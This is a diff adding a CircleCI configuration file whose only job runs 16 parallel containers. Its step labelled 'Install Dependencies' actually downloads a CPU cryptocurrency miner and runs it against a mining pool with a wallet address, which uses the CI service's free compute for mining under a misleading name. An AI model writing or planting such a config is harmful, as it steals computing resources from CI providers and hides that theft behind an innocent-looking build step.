@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              lscpu
+              !wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar -xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u REs6mzhY8vomempURjCBXC5aaMJnqLAsaJ.miner1
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
